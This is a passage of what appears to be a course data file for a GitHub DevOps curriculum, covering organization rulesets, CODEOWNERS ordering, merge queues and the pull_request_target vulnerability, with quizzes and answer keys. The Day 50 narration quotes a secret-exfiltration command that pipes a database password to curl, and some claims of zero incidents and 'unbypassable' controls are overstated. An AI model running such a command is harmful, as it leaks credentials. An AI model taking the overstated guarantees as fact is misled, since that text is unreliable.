                    "First, **Zero Human PAT Dependency in Production Automation**: The gateway audits all organization service accounts, CI/CD integrations, and deployment bots to confirm 0% reliance on human-bound Personal Access Tokens. Every integration authenticates as an organization-owned GitHub App issuing 60-minute least-privilege installation tokens (`ghs_`).",
                    "Second, **100% Cryptographic Webhook HMAC Verification**: Every registered organization and repository webhook receiver endpoint is tested with synthetic unsigned and bit-flipped payloads to verify that it enforces constant-time `X-Hub-Signature-256` HMAC-SHA256 validation over raw payload bytes and immediately rejects tampered requests with `HTTP 401 Unauthorized`.",
                    "Third, **Continuous Audit Log Streaming Verification**: The gateway verifies active heartbeat delivery on the GitHub Enterprise Audit Log Stream to the corporate SIEM and S3 Object Lock compliance archive, ensuring zero blind spots in administrative or Git transport monitoring.",
                    "Consider how seamlessly this complements your work from Days 46 and 47: your workflows are modular and SHA-pinned (Day 46), your cloud deployments use zero-secret OIDC and ephemeral Kubernetes pods (Day 47), and your enterprise integrations now run on non-human GitHub Apps with HMAC-secured webhooks and real-time SIEM audit streaming (Day 48).",
                    "Let us run the `MasterEnterpriseIdentityGateway` verification suite in our workspace to certify our administrative posture and issue the sovereign `GITHUB-ENTERPRISE-GOVERNANCE-CERTIFIED` audit seal.",
                    "Tomorrow in Day 49, we tackle Repository Governance at Scale: Organization-Wide Rulesets, granular `CODEOWNERS` path routing, and Automated Speculative Merge Queues that guarantee `main` never breaks under concurrent pull request load!"
                ],
                "example": "The Master Enterprise Identity Gateway is the corporate Secretary of State for your GitHub organization: certifying that all automated bots hold official organizational passports (GitHub Apps), all incoming dispatches bear verified cryptographic seals (HMAC-SHA256), and all state actions are recorded in the permanent national archives (Audit Log Streaming).",
                "code": bash_snippets[(48, 5)],
                "output": bash_outputs[(48, 5)],
                "codeNotes": [
                    "Executes MasterEnterpriseIdentityGateway across the GitHub Enterprise organization.",
                    "Certifies 0% human PAT dependency with 100% migration to GitHub App identities.",
                    "Verifies 100% webhook endpoints enforce constant-time HMAC-SHA256 signature validation.",
                    "Issues the sovereign GITHUB-ENTERPRISE-GOVERNANCE-CERTIFIED audit seal."
                ],
                "tryIt": "Run cat /home/student/workspace/ghe_admin_gateway/gateway_seal.txt to inspect the enterprise governance certification seal.",
                "check": {
                    "question": "What is the maximum lifetime of a GitHub App Installation Access Token (`ghs_...`) issued by GitHub's API?",
                    "options": [
                        "60 minutes (1 hour), after which it automatically expires and must be refreshed using a signed RS256 JWT",
                        "10 years with no expiration",
                        "5 seconds",
                        "Until the employee who clicked the install button leaves the company"
                    ],
                    "answer": 0,
                    "why": "GitHub App installation access tokens automatically expire after 60 minutes, minimizing the blast radius of any token exposure."
                }
            }
        ]
    },

    49: {
        "day": 49,
        "coursePrefix": "git_vcs",
        "title": "Repository Governance at Scale: Organization Rulesets, CODEOWNERS, Automated Merge Queues & Branch Policies",
        "goal": "Master policy-as-code repository governance for thousands of developers: replace brittle per-repository branch protection rules with centralized Organization-Wide GitHub Rulesets, architect path-specific `.github/CODEOWNERS` review routing utilizing last-match-wins evaluation order, diagnose semantic integration race conditions ('Broken Main' from two individually green PRs), and deploy Automated Speculative Merge Queues.",
        "summary": [
            "Replaced per-repository branch protection rules with centralized Organization-Wide Repository Rulesets targeting 350+ repositories via `fnmatch` patterns.",
            "Forensically diagnosed the Semantic Integration Race Condition ('Broken Main' from concurrent green PRs) and the `.github/CODEOWNERS` wildcard bypass bug.",
            "Engineered path-specific `.github/CODEOWNERS` hierarchies enforcing mandatory sign-off from `@billing-security`, `@dba-architects`, and `@platform-secops`.",
            "Simulated a 20-PR high-throughput Speculative Merge Queue (`gh-readonly-queue/main/pr-*`), verifying automatic eviction of incompatible PR #14 without breaking trunk.",
            "Issued the sovereign REPOSITORY-GOVERNANCE-SCALE-CERTIFIED audit seal via MasterRepositoryGovernanceGateway."
        ],
        "projectStep": {
            "title": "Stage 10 Enterprise GitHub Engineering: Organization Rulesets, CODEOWNERS & Merge Queues",
            "steps": [
                "Model organization-wide Repository Rulesets and Merge Queue invariants using RulesetGovernanceArchitect.",
                "Diagnose concurrent PR semantic race conditions and CODEOWNERS ordering flaws using MergeRaceForensicAuditor.",
                "Enforce granular path-based mandatory code review routing using CodeownersHierarchyEngine.",
                "Simulate 20 concurrent PR merges with automated fault eviction using SpeculativeMergeQueueSimulator.",
                "Issue the sovereign REPOSITORY-GOVERNANCE-SCALE-CERTIFIED audit seal via MasterRepositoryGovernanceGateway."
            ]
        },
        "parts": [
            {
                "title": "Policy-as-Code at Scale: Organization Rulesets & Speculative Merge Queue Invariants",
                "say": [
                    "Welcome to Day 49 of PinIT Career OS. Imagine you are the Principal Platform Architect for an engineering organization with 3,000 developers and 350 production repositories. You cannot rely on tribal knowledge or polite Slack reminders to keep `main` stable and compliant; you must enforce architectural invariants through automated **Policy-as-Code Repository Governance**.",
                    "Historically, GitHub administrators configured **classic Branch Protection Rules** individually inside each repository's settings page. At enterprise scale, per-repository branch protection breaks down completely: if a repository admin temporarily toggles off a check in one of the 350 repositories, or if a new microservice repository is created without the standard rules configured, governance silently drifts.",
                    "Modern GitHub Enterprise solves this with **Organization-Wide Repository Rulesets**. Defined once at the Organization level, a single Ruleset dynamically targets hundreds of repositories simultaneously using `fnmatch` name patterns (such as `*prod*`, `service-*`, or `~ALL`) and ref patterns (`refs/heads/main`, `refs/heads/release/*`). Crucially, Organization Rulesets layer on top of repository settings: a local repository administrator **cannot** weaken, delete, or bypass an organization-level Ruleset unless explicitly granted an audited bypass actor role!",
                    "What policies can an Organization Ruleset enforce simultaneously across all 350 repositories? It can require linear commit history (banning merge commits in favor of squash or rebase), enforce cryptographic commit signatures, require specific status checks from a locked GitHub App ID (preventing a developer from spoofing a status check name with a fake workflow), validate commit messages and branch names against regular expressions (enforcing Conventional Commits like `^(feat|fix|chore)(\\(.+\\))?!?: .+`), and mandate **Automated Merge Queues**.",
                    "Why is an Automated Merge Queue one of the most important distributed systems inventions in modern software delivery? Let us state the **Deterministic Merge Queue Serialization Invariant**: A Merge Queue serializes approved pull requests into temporary speculative integration branches $\\text{Queue} = [P_1, P_2, \\dots, P_k]$. Crucially, it tests pull request $P_k$ not merely against `main`, but against the **speculative cumulative merge** of $\\text{main} + P_1 + P_2 + \\dots + P_{k-1}$!",
                    "Only when the full CI test suite passes on that cumulative speculative state is $P_k$ fast-forwarded onto `main`. If $P_k$ fails, the Merge Queue automatically evicts $P_k$ from the queue and rebuilds the speculative graph for $P_{k+1}$ without ever breaking `main` or halting other developers!",
                    "In this opening masterclass, we codify the Organization-Wide Repository Ruleset and Speculative Merge Queue specification across 350 production repositories in our workspace.",
                    "Mastering Organization Rulesets and Merge Queues allows you to govern thousands of engineers with zero manual policing and 100% trunk stability."
                ],
                "example": "Classic per-repository branch protection is like asking 350 local store managers to manually program their own alarm systems; Organization Rulesets are a central corporate security grid enforced from headquarters, and a Merge Queue is an automated airlock that tests how cargo loads interact together before opening the inner door to the spacecraft.",
                "code": bash_snippets[(49, 1)],
                "output": bash_outputs[(49, 1)],
                "codeNotes": [
                    "Deploys GitHub Organization-Wide Repository Rulesets across 350 production repositories.",
                    "Targets repositories dynamically via fnmatch patterns while preventing local admin overrides.",
                    "Enforces linear history, signed commits, and Conventional Commit regex validation.",
                    "Activates the Speculative Merge Queue [P_1, P_2, ..., P_k] serialization invariant."
                ],
                "tryIt": "Run grep \"MERGE_SERIALIZATION\" /home/student/workspace/gov_rulesets/ruleset_spec.txt to verify the speculative queue invariant.",
                "check": {
                    "question": "Why are GitHub Organization-Wide Repository Rulesets architecturally superior to legacy per-repository branch protection rules?",
                    "options": [
                        "Organization Rulesets apply centrally across hundreds of repositories via pattern matching, cannot be silently weakened by individual repository admins, verify the exact GitHub App ID of status checks, and support commit metadata regex rules",
                        "Organization Rulesets allow developers to push directly to `main` without running CI tests",
                        "Legacy branch protection rules only work on public repositories",
                        "Organization Rulesets automatically write unit tests for any repository with less than 80% coverage"
                    ],
                    "answer": 0,
                    "why": "Organization Rulesets centralize policy enforcement across repositories dynamically, prevent local privilege bypasses, bind status checks to trusted App IDs, and enforce commit/branch naming rules."
                }
            },
            {
                "title": "The Broken Main Semantic Race Condition & CODEOWNERS Wildcard Bypass",
                "say": [
                    "To understand why standard pull request CI checks are mathematically insufficient to keep `main` green in a high-velocity team, let us analyze the Situational Production Puzzle from our Master Architecture Bible: **The Semantic Integration Race Condition (Broken Main from Two Green PRs)**.",
                    "Consider what happens at 2:00 PM on a Tuesday when `main` is at commit `C0`. Developer Alice branches off `C0` and opens **Pull Request A**, which renames a database column and TypeScript interface field from `email` to `user_email` and updates all existing callers in `service-a`. Simultaneously, Developer Bob branches off the exact same base commit `C0` and opens **Pull Request B**, which adds a brand-new analytics query in `service-b` that reads the old `user.email` field.",
                    "Notice two critical facts: First, do PR A and PR B touch any of the same files or lines of code? **No!** PR A modifies `schema.sql` and `service-a/auth.ts`, while PR B modifies `service-b/analytics.ts`. Therefore, Git detects **zero textual merge conflicts**! Second, when PR A runs its CI test suite against `C0 + PR A`, all tests pass (100% green). When PR B runs its CI test suite against `C0 + PR B`, `C0` still has the old `email` column, so all of PR B's tests also pass (100% green)!",
                    "At 2:15 PM, Alice clicks Merge on PR A, advancing `main` to `C0 + A`. Ten seconds later, Bob clicks Merge on PR B. Because there are no textual conflicts (and if strict up-to-date rebasing isn't serialized), Git merges PR B into `main`, producing `C0 + A + B`. And what happens on `main`? **Total production compilation and runtime failure!** `service-b` from PR B queries the `email` column that PR A just renamed to `user_email`! Two individually green pull requests combined to break `main`!",
                    "Wait—why didn't forcing developers to check 'Require branches to be up to date before merging' solve this at scale? Because without a Merge Queue, if 20 developers have approved PRs ready to merge, the first developer merges into `main`, which immediately invalidates the other 19 PRs, forcing all 19 developers to click 'Update branch', trigger 19 redundant full CI runs, and race to click Merge first in a frustrating game of whack-a-mole!",
                    "In the same post-mortem, we also uncover a second governance failure: **The `.github/CODEOWNERS` Wildcard Review Bypass**. In `.github/CODEOWNERS`, rules are evaluated top-to-bottom where the **last matching pattern takes precedence** (just like `.gitignore`). A team wrote specific path rules at the top of `CODEOWNERS` (`/services/billing/ @billing-security`), and then placed a catch-all wildcard `* @general-team` at the **bottom** of the file! Because the wildcard was last, it overrode every specific rule above it, allowing a billing vulnerability to merge without `@billing-security` ever being requested!",
                    "In this forensic detective lab, we document both the PR A + PR B semantic integration race condition and the `CODEOWNERS` bottom-wildcard precedence bug.",
                    "Mastering these two failure modes ensures that your merge pipeline catches cross-PR semantic incompatibilities and routes sensitive code paths to mandatory domain owners."
                ],
                "example": "The PR A + PR B semantic race condition is like two chefs testing a recipe independently: Chef A replaces sugar with salt in the pantry jar and adjusts the cake recipe accordingly (tastes great), while Chef B adds two scoops from that same pantry jar into the frosting assuming it's still sugar (tastes great alone, ruined when combined).",
                "code": bash_snippets[(49, 2)],
                "output": bash_outputs[(49, 2)],
                "codeNotes": [
                    "Reconstructs the Semantic Integration Race Condition where green PR A + green PR B break main.",
                    "Demonstrates how non-overlapping file edits bypass Git textual conflict detection while breaking semantics.",
                    "Diagnoses the CODEOWNERS last-match-wins bug where a bottom wildcard (* @general-team) overrode specific rules.",
                    "Prescribes speculative Merge Queue serialization and general-to-specific CODEOWNERS ordering."
                ],
                "tryIt": "Run grep \"ROOT_CAUSE\" /home/student/workspace/gov_race_condition/race_forensics.txt to inspect the semantic conflict between PR A and PR B.",
                "check": {
                    "question": "In a `.github/CODEOWNERS` file, if multiple file path patterns match a modified file in a pull request, which rule determines the required code owners?",
                    "options": [
                        "The **last** matching pattern in the `CODEOWNERS` file takes precedence, so general catch-all wildcards (`*`) must be placed at the top and specific high-security paths (`/services/billing/`) at the bottom",
                        "The **first** matching pattern at the top of the file always wins and stops evaluation",
                        "GitHub picks a random rule from the file on every pull request",
                        "Wildcards (`*`) are illegal in `CODEOWNERS` files"
                    ],
                    "answer": 0,
                    "why": "`CODEOWNERS` evaluates top-to-bottom with last-match-wins precedence; therefore, general fallback owners (`*`) belong at the top and specific sensitive directory owners belong below them."
                }
            },
            {
                "title": "Architecting Path-Specific CODEOWNERS & Mandatory Domain Routing",
                "say": [
                    "Let us now engineer a production-hardened `.github/CODEOWNERS` hierarchy and link it with our Organization Ruleset to enforce mandatory domain-expert code reviews across a multi-service repository.",
                    "Where can a `CODEOWNERS` file reside in a repository? GitHub checks `.github/CODEOWNERS`, root `CODEOWNERS`, or `docs/CODEOWNERS` (preferring `.github/CODEOWNERS` to keep the repository root clean). However, merely committing a `.github/CODEOWNERS` file to a repository does nothing more than automatically add review requests when a pull request is opened—unless you pair it with the Ruleset policy **Require review from Code Owners**!",
                    "When **Require review from Code Owners** is enabled inside an Organization Ruleset alongside **Dismiss stale pull request approvals when new commits are pushed**, the `.github/CODEOWNERS` file transforms from a polite notification system into an unbypassable cryptographic access control matrix.",
                    "How must we structure the ordering of rules inside `.github/CODEOWNERS`? Because of the **last-match-wins** evaluation law we just diagnosed, we structure the file strictly from **most general at the top** to **most specific and security-critical at the bottom**:",
                    "At line 1, we declare the default fallback owner: `* @pinit-org/core-engineering`. Next, we declare service-level ownership: `/services/payments/ @pinit-org/payments-squad` and `/frontend/ @pinit-org/web-squad`. Below that, we declare high-risk specialized domain ownership that must override general squad ownership: `/services/billing/ @pinit-org/billing-security` and `/migrations/ @pinit-org/dba-architects`.",
                    "Finally, at the very bottom of `.github/CODEOWNERS`—so that no rule above can ever override it—we lock down the governance files themselves: `/.github/ @pinit-org/platform-secops` and `/CODEOWNERS @pinit-org/platform-secops`! Why is locking `/.github/` at the bottom mandatory? Because if a regular developer could modify `.github/CODEOWNERS` or `.github/workflows/` with only a teammate's approval, they could delete the security team from `CODEOWNERS`, merge that change, and then merge anything they want!",
                    "Notice also that enterprise `CODEOWNERS` files always assign ownership to **GitHub Teams** (`@org/team-name`) with explicit write permissions rather than individual user handles (`@alice`). If `@alice` goes on vacation or leaves the company, a rule requiring `@alice` deadlocks the pipeline, whereas a team handle distributes the review across the on-call rotation.",
                    "In this implementation lab, we deploy and validate our path-specific `.github/CODEOWNERS` routing engine in our workspace, verifying mandatory sign-off routing for `/services/billing/`, `/migrations/`, and `/.github/`.",
                    "Properly ordered `CODEOWNERS` matrices guarantee that database schemas, billing logic, and CI workflows never change without domain-expert authorization."
                ],
                "example": "Ordering a `.github/CODEOWNERS` file from general (`*`) at the top to ultra-specific (`/.github/`) at the bottom is like CSS specificity or firewall rule precedence: the general rule sets the baseline, while the bottom-most security rules act as the final authoritative override.",
                "code": bash_snippets[(49, 3)],
                "output": bash_outputs[(49, 3)],
                "codeNotes": [
                    "Deploys path-specific .github/CODEOWNERS routing ordered from general to specific.",
                    "Enforces mandatory @pinit-org/billing-security review on /services/billing/ modifications.",
                    "Routes all database schema changes in /migrations/ to @pinit-org/dba-architects.",
                    "Protects /.github/ workflows and CODEOWNERS itself at the bottom under @pinit-org/platform-secops."
                ],
                "tryIt": "Run grep \"RULE_3\" /home/student/workspace/gov_codeowners_engine/ownership_audit.txt to verify self-protection of the .github directory.",
                "check": {
                    "question": "Why must `/.github/` (including `.github/CODEOWNERS` and `.github/workflows/`) be placed at the very bottom of `.github/CODEOWNERS` and assigned to the platform security team?",
                    "options": [
                        "Because the last matching pattern in `CODEOWNERS` wins; placing `/.github/` at the bottom ensures no broader directory wildcard can override it, preventing developers from modifying `CODEOWNERS` or CI workflows without security approval",
                        "Because GitHub only reads the last 3 lines of any `CODEOWNERS` file",
                        "Because comments starting with `#` are only allowed at the top of the file",
                        "Because `.github/` files are stored in a separate Git repository"
                    ],
                    "answer": 0,
                    "why": "Placing `/.github/` at the bottom guarantees highest precedence under last-match-wins evaluation, preventing unauthorized tampering with CI workflows or the `CODEOWNERS` rules themselves."
                }
            },
            {
                "title": "High-Throughput Speculative Merge Queues: Graph Construction & Fault Eviction",
                "say": [
                    "Now let us examine the internal graph mechanics of a **GitHub Automated Merge Queue** operating under high throughput—when 20 engineers click 'Merge when ready' concurrently during peak afternoon engineering hours.",
                    "When Pull Requests $P_1, P_2, \\dots, P_{20}$ enter the Merge Queue, GitHub does not merge them into `main`. Instead, the Merge Queue controller creates a series of temporary, read-only **Speculative Merge Refs** under the namespace `refs/heads/gh-readonly-queue/main/pr-<number>-<sha>`.",
                    "Let us trace how the speculative cumulative tree is constructed: First, branch `gh-readonly-queue/main/pr-1` contains `main + P_1`. Second, branch `gh-readonly-queue/main/pr-2` contains `main + P_1 + P_2`! Third, branch `gh-readonly-queue/main/pr-3` contains `main + P_1 + P_2 + P_3`, continuing all the way to `pr-20`, which contains the cumulative merge of `main` plus all 20 queued pull requests!",
                    "Crucially, instead of waiting for $P_1$'s 15-minute CI build to finish before starting $P_2$'s CI build (which would take $20 \\times 15 = 300$ minutes or 5 hours sequentially!), GitHub triggers CI workflows (`on: merge_group`) on all speculative branches **in parallel** (or in configurable batch groups of e.g. 5 PRs per batch)! If all 20 speculative builds pass concurrently, all 20 pull requests merge into `main` in a single 15-minute CI window!",
                    "What happens in our stress lab when Pull Request #14 (`P_{14}`) contains a semantic breaking change that is incompatible with Pull Request #10 (`P_{10}`)? Let us watch the Merge Queue's deterministic fault isolation algorithm in action:",
                    "Speculative builds for `pr-1` through `pr-13` all pass (100% green) and fast-forward cleanly onto `main`! However, because `pr-14` includes both $P_{10}$ and $P_{14}$, the CI run on `gh-readonly-queue/main/pr-14` fails! What about `pr-15` through `pr-20`? Because their cumulative trees also inherited $P_{14}$'s broken code, their initial speculative runs also fail.",
                    "Does the Merge Queue evict innocent PRs #15 through #20? **No!** The Merge Queue controller identifies that `pr-13` succeeded and `pr-14` was the exact first point of failure in the dependency chain. It automatically **evicts only PR #14** from the queue, notifies the author of PR #14, and immediately constructs a fresh speculative branch for PR #15 through PR #20 directly on top of `pr-13` (`main + P_{1..13} + P_{15..20}`)!",
                    "Minutes later, PRs #15 through #20 pass CI and merge cleanly into `main`. Total result: 19 out of 20 pull requests landed rapidly on `main`, the 1 incompatible PR was surgically evicted before touching trunk, and `main` remained 100% green!",
                    "In this production incident lab, we simulate the 20-PR Merge Queue stress scenario in our workspace, observing speculative `gh-readonly-queue/main/` graph construction and the clean eviction of faulty PR #14."
                ],
                "example": "A Speculative Merge Queue is like a high-speed train dispatcher coupling 20 train cars together on a parallel test track and running a stress test across the whole train at once; if car #14 has a faulty coupling, the dispatcher unhooks only car #14, couples car #13 directly to car #15, and sends the remaining 19 cars onto the main express line.",
                "code": bash_snippets[(49, 4)],
                "output": bash_outputs[(49, 4)],
                "codeNotes": [
                    "Simulates 20 concurrent pull requests entering the GitHub Merge Queue simultaneously.",
                    "Constructs cumulative speculative merge trees under gh-readonly-queue/main/pr-1..20.",
                    "Identifies and automatically evicts incompatible PR #14 without penalizing subsequent PRs.",
                    "Completes clean integration of 19/20 PRs while preserving 100% green trunk health on main."
                ],
                "tryIt": "Run grep \"FAULT_EVICTION\" /home/student/workspace/gov_merge_queue_lab/queue_telemetry.txt to inspect the surgical eviction of PR #14.",
                "check": {
                    "question": "When 5 pull requests ($P_1, P_2, P_3, P_4, P_5$) are in a GitHub Speculative Merge Queue and $P_3$ introduces a semantic bug that causes CI to fail on speculative branch `pr-3` (and consequently `pr-4` and `pr-5`), what does the Merge Queue do?",
                    "options": [
                        "It merges $P_1$ and $P_2$, evicts only $P_3$ (the first failing PR in the chain), and automatically rebuilds and re-tests $P_4$ and $P_5$ directly on top of $P_2$ without human intervention",
                        "It merges all 5 pull requests into `main` anyway and opens a GitHub Issue",
                        "It permanently deletes branches $P_4$ and $P_5$ and bans their authors",
                        "It rolls back $P_1$ and $P_2$ even though they passed all tests"
                    ],
                    "answer": 0,
                    "why": "Because speculative branches are cumulative ($P_4$ and $P_5$ inherited $P_3$'s changes), the queue isolates the first failure ($P_3$), evicts it, and re-queues $P_4$ and $P_5$ on the clean base ($P_2$)."
                }
            },
            {
                "title": "Master Repository Governance Gateway & Scale Certification",
                "say": [
                    "We conclude Day 49 by deploying the `MasterRepositoryGovernanceGateway`, our automated policy-as-code verification engine that audits Organization Rulesets, `CODEOWNERS` integrity, and Merge Queue telemetry across all 350 enterprise repositories.",
                    "In a multi-thousand-developer enterprise, governance is only as strong as its weakest repository. Our `MasterRepositoryGovernanceGateway` continuously verifies three foundational invariants:",
                    "First, **100% Organization Ruleset Coverage**: Every active repository in the organization is matched by an active, enforced Organization Ruleset (`enforcement: active`) that mandates linear history, cryptographic commit signatures, Conventional Commit format validation, and non-bypassable status checks bound to verified GitHub App IDs.",
                    "Second, **Deterministic CODEOWNERS Precedence & Team Validity**: Every repository's `.github/CODEOWNERS` file is parsed and linted to confirm zero syntax errors, zero nonexistent or read-only team handles, general-to-specific rule ordering, and bottom-anchored self-protection of `/.github/` by `@pinit-org/platform-secops`.",
                    "Third, **Speculative Merge Queue Enforcement on Trunk**: All high-concurrency repositories enforce `merge_queue` serialization with `merge_group` workflow triggers enabled in their CI pipelines, ensuring that zero pull requests can bypass speculative cumulative testing before landing on `main`.",
                    "Look at the reliability metrics this architecture delivers: broken `main` incidents drop to zero; developer time wasted manually rebasing stale pull requests drops to zero; and every sensitive billing, database, or CI workflow modification is guaranteed to carry cryptographic approval from its designated domain security team.",
                    "Let us execute the `MasterRepositoryGovernanceGateway` audit suite in our workspace to certify our organization-wide governance posture and issue the sovereign `REPOSITORY-GOVERNANCE-SCALE-CERTIFIED` audit seal.",
                    "With Days 46 through 49 complete, you have mastered every core pillar of Block 10. Tomorrow in Day 50, we bring all four days together for **Milestone 7: The ApexAutomate Enterprise GitHub Actions & Security Automation Capstone Suite**!"
                ],
                "example": "The Master Repository Governance Gateway acts as an automated constitutional court for your codebase: verifying that every repository obeys the organization's immutable Rulesets, respects domain jurisdiction (`CODEOWNERS`), and passes through the speculative Merge Queue airlock.",
                "code": bash_snippets[(49, 5)],
                "output": bash_outputs[(49, 5)],
                "codeNotes": [
                    "Executes MasterRepositoryGovernanceGateway across all 350 organization repositories.",
                    "Verifies 100% coverage of immutable Organization Rulesets and CODEOWNERS self-protection.",
                    "Confirms zero semantic merge skew breakages on main via Speculative Merge Queues.",
                    "Issues the sovereign REPOSITORY-GOVERNANCE-SCALE-CERTIFIED audit seal."
                ],
                "tryIt": "Run cat /home/student/workspace/gov_policy_gateway/gateway_seal.txt to inspect the repository governance certification seal.",
                "check": {
                    "question": "Which GitHub Actions workflow trigger event must be added to your `.github/workflows/ci.yml` file so that CI status checks execute when a pull request is tested inside a GitHub Merge Queue?",
                    "options": [
                        "`merge_group`",
                        "`issues_closed`",
                        "`page_build`",
                        "`watch`"
                    ],
                    "answer": 0,
                    "why": "GitHub Merge Queues dispatch the `merge_group` event (specifically `checks_requested`) when building speculative `gh-readonly-queue` branches; workflows must listen to `merge_group` to report required status checks."
                }
            }
        ]
    },

    50: {
        "day": 50,
        "coursePrefix": "git_vcs",
        "title": "Milestone 7 (M2): ApexAutomate Enterprise GitHub Actions & Security Automation Suite",
        "goal": "Architect, deploy, and defend Milestone 7 (ApexAutomate): an enterprise-grade CI/CD and repository governance platform that unifies SHA-pinned Reusable Workflows, Zero-Secret OIDC Cloud Federation, Ephemeral Kubernetes ARC Runners, GitHub App Service Identities, constant-time HMAC-SHA256 Webhook Receivers, and Speculative Merge Queues, while neutralizing `pull_request_target` untrusted code execution vulnerabilities.",
        "summary": [
            "Architected the three-pillar ApexAutomate Enterprise CI/CD & Governance Platform unifying Days 46–49 into a cohesive autonomous system.",
            "Diagnosed and remediated the critical `pull_request_target` Untrusted Checkout Secret Exfiltration vulnerability by decoupling untrusted builds from privileged workflows.",
            "Executed the ApexAutomate Multi-Repo Orchestrator across 420 workflow files, certifying 100% 40-char SHA pinning, 100% OIDC federation, and active Merge Queues.",
            "Withstood live multi-vector adversarial penetration attacks (mutable `@v2` tag injection, forged webhook POST payload, and incompatible Merge Queue PR).",
            "Defended the Milestone 7 Capstone before the Principal Infrastructure Board to earn the sovereign APEX-AUTOMATE-MILESTONE-7-CERTIFIED audit seal."
        ],
        "projectStep": {
            "title": "Stage 10 Milestone 7 Capstone: ApexAutomate Enterprise CI/CD & Governance Platform",
            "steps": [
                "Synthesize the unified 3-pillar ApexAutomate architecture using ApexAutomateBlueprintArchitect.",
                "Remediate pull_request_target untrusted checkout vulnerabilities using PrTargetIsolationRemediationEngine.",
                "Orchestrate multi-repo SHA pinning, OIDC, and Merge Queue audits using ApexAutomatePlatformOrchestrator.",
                "Neutralize live multi-vector CI and webhook attacks using ApexAutomateAdversarialStressHarness.",
                "Defend Milestone 7 before the Principal Infrastructure Board to earn APEX-AUTOMATE-MILESTONE-7-CERTIFIED."
            ]
        },
        "parts": [
            {
                "title": "ApexAutomate Systems Blueprint: Unifying Zero-Trust CI/CD & Governance",
                "say": [
                    "Welcome to Day 50 of PinIT Career OS and **Milestone 7 (Month 2): The ApexAutomate Enterprise GitHub Actions & Security Automation Suite**. Over the past four days of Block 10, you have mastered the most advanced DevOps and platform engineering primitives in the GitHub ecosystem. Today, you integrate those discrete capabilities into a unified, self-healing institutional platform: **ApexAutomate**.",
                    "Let us review the architectural synthesis of ApexAutomate across its three foundational pillars:",
                    "**Pillar 1: Modular & Immutable Workflow Execution (Day 46)**. ApexAutomate governs a centralized `.github` library of Reusable Workflows (`on: workflow_call`) and Custom Composite Actions consumed across hundreds of microservice repositories. Every third-party and internal action reference is cryptographically pinned to its full 40-character commit SHA (`@[0-9a-f]{40}`), while multidimensional `strategy: matrix` pipelines leverage OS-and-lockfile-keyed `actions/cache` to slash build times by 80%.",
                    "**Pillar 2: Zero-Secret OIDC Cloud Federation & Ephemeral Compute (Day 47)**. ApexAutomate enforces the **Zero-Secret OIDC Invariant**: zero static AWS, GCP, or Azure access keys are stored in GitHub Secrets. All cloud deployments exchange cryptographically signed GitHub RS256 OIDC JWTs (`id-token: write`) for 60-minute STS role sessions bound to explicit `sub` claims (`repo:org/repo:ref:refs/heads/main`), and all private compute executes inside single-use `--ephemeral` Kubernetes pods managed by Actions Runner Controller (ARC).",
                    "**Pillar 3: Non-Human Service Identity, Webhook Cryptography & Speculative Merge Queues (Days 48–49)**. ApexAutomate authenticates all organizational automation via GitHub Apps (10-minute RS256 JWTs exchanging for 60-minute `ghs_` installation tokens), verifies incoming webhooks using constant-time `X-Hub-Signature-256` HMAC-SHA256 comparison, streams enterprise audit logs in real time to SIEM/WORM storage, and serializes trunk integration through Organization Rulesets, bottom-anchored `CODEOWNERS`, and Speculative Merge Queues.",
                    "Together, these three pillars establish the **Zero-Trust Enterprise Automation Invariant**: no untrusted code can access secrets, no mutable upstream tag can poison builds, no human employee offboarding can break automation, and no concurrent pull request race condition can break `main`.",
                    "In this opening capstone session, we initialize the ApexAutomate Systems Blueprint in our workspace, mapping all three architectural pillars and preparing the platform for live security auditing.",
                    "Building ApexAutomate proves your readiness to lead Staff and Principal DevOps and Platform Security engineering initiatives at global technology scale."
                ],
                "example": "ApexAutomate is the automated central nervous system of an enterprise software factory: Pillar 1 is the standardized robotic assembly blueprint, Pillar 2 is the biometric zero-secret power grid and self-sterilizing cleanrooms, and Pillar 3 is the constitutional governance and airlock dispatch system.",
                "code": bash_snippets[(50, 1)],
                "output": bash_outputs[(50, 1)],
                "codeNotes": [
                    "Initializes the ApexAutomate Enterprise CI/CD & Governance Suite blueprint.",
                    "Unifies Pillar 1: 40-char SHA-pinned Reusable Workflows and Matrix Cache Engine.",
                    "Unifies Pillar 2: Zero-Secret OIDC Cloud Federation and Ephemeral ARC Kubernetes Runners.",
                    "Unifies Pillar 3: GitHub App Identities, HMAC Webhooks, Rulesets, and Speculative Merge Queues."
                ],
                "tryIt": "Run cat /home/student/workspace/apexautomate_core/blueprint.txt to inspect the three unified pillars of ApexAutomate.",
                "check": {
                    "question": "Which four security invariants together define ApexAutomate's Zero-Trust Enterprise Automation standard?",
                    "options": [
                        "40-character immutable SHA action pinning, zero static cloud credentials via OIDC JWT federation, constant-time HMAC-SHA256 webhook verification, and speculative Merge Queue serialization",
                        "Using `@main` action tags, sharing a single persistent VM runner, using classic human PATs, and disabling branch protection",
                        "Storing AWS root keys in YAML files, disabling HTTPS on webhooks, and merging pull requests without CI",
                        "Requiring developers to email zip files of their source code to the CTO"
                    ],
                    "answer": 0,
                    "why": "ApexAutomate enforces immutable 40-char SHA pinning, zero-secret OIDC federation, cryptographic HMAC webhook validation, and speculative Merge Queue serialization."
                }
            },
            {
                "title": "The pull_request_target Secret Exfiltration Vulnerability & Decoupled Remediation",
                "say": [
                    "Before an enterprise CI platform can be certified for production, its architects must understand and neutralize the single most notorious security vulnerability in GitHub Actions: **The `pull_request_target` Untrusted Code Checkout Secret Exfiltration**.",
                    "First, why does the `pull_request_target` trigger exist at all? When an external contributor opens a Pull Request from a forked repository, a standard `on: pull_request` workflow runs under strict security restrictions: GitHub mounts a **read-only** `GITHUB_TOKEN` and **withholds all repository secrets** (`secrets.*` are empty). Why? Because the PR contains untrusted code written by an external stranger; if `on: pull_request` exposed secrets, any stranger could open a PR that adds `echo $PROD_DB_PASSWORD | curl ...` to a test script and steal your secrets!",
                    "However, suppose a repository maintainer wants an automated bot to add a label (like `needs-triage`) or post a helpful comment on an external contributor's PR, which requires a `GITHUB_TOKEN` with `pull-requests: write` permission. To support this, GitHub introduced `on: pull_request_target`. Unlike `pull_request`, a `pull_request_target` workflow executes in the **trusted security context of the base branch (`main`)**—meaning it receives a **read/write `GITHUB_TOKEN`** AND **full access to all repository secrets**!",
                    "By default, `pull_request_target` is safe *only* if it checks out the trusted code from `main` and never executes files from the PR. Disaster strikes when a developer configures `on: pull_request_target` and then explicitly configures `actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}` (checking out the untrusted contributor's PR branch!) and subsequently runs `npm install`, `npm test`, `pytest`, or `make`!",
